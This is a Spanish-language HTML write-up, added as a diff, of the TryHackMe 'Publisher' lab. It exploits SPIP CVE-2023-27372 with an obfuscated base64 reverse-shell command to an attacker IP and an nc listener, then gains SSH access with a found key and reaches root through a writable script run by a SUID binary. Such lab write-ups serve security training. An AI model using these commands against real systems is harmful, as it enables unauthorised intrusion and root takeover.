@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>TryHackMe - Publisher - Writeup</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 2em; background-color: #f8f8f8; color: #333; }
+    h1, h2, h3 { color: #444; }
+    pre { background: #eee; padding: 1em; border-radius: 5px; overflow-x: auto; }
+    code { font-family: monospace; }
+    .flag { background-color: #dff0d8; padding: 0.5em; border-left: 4px solid #3c763d; }
+  </style>
+</head>
+<body>
+
+<h1>TryHackMe - Publisher</h1>
+<h2>Acceso inicial (RCE sin autenticación - CVE-2023-27372)</h2>
+
+<p>SPIP <code>&lt; 4.2.1</code> es vulnerable a ejecución remota de comandos vía el parámetro <code>oubli</code> en el formulario <code>spip_pass</code>. Se explota así:</p>
+
+<pre><code>python3 51536.py -u http://10.10.13.117/spip -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjE3MS40Ni80NDMzIDA+JjE= | base64 -d | bash"</code></pre>
+
+<p>Reverse shell en Kali:</p>
+
+<pre><code>nc -lvnp 4433</code></pre>
+
+<h2>Acceso por SSH (usuario: think)</h2>
+
+<p>Tras explorar el sistema, se encuentra una clave privada SSH que permite acceso como <code>think</code>:</p>
+
+<pre><code>chmod 600 id_think
+ssh -i id_think think@10.10.13.117</code></pre>
+
+<h2>Escalada de privilegios (SUID binario mal configurado)</h2>
+
+<p>Se descubre un binario con SUID: <code>/usr/sbin/run_container</code>, el cual ejecuta un script externo como root:</p>
+
+<pre><code>strings /usr/sbin/run_container | grep -i sh
+→ /opt/run_container.sh</code></pre>
+
+<p>El script es editable por el usuario <code>think</code>, por lo tanto se puede inyectar una shell:</p>
+
+<pre><code>echo "/bin/bash -p" > /opt/run_container.sh
+/usr/sbin/run_container</code></pre>
+
+<h2 class="flag">✔️ Obtenido root con éxito</h2>
+
+<pre><code>whoami
+→ root
+
+cat /root/root.txt
+→ THM{...FLAG...}</code></pre>
+
+<h2>Resumen de vectores</h2>
+
+<ul>
+  <li><strong>Acceso inicial:</strong> RCE en SPIP 4.2.0</li>
+  <li><strong>Persistencia:</strong> clave SSH descubierta</li>
+  <li><strong>Privesc:</strong> binario SUID ejecutando script controlado</li>
+</ul>
+
+<p>Máquina resuelta con éxito 🚩</p>
+
+</body>
+</html>
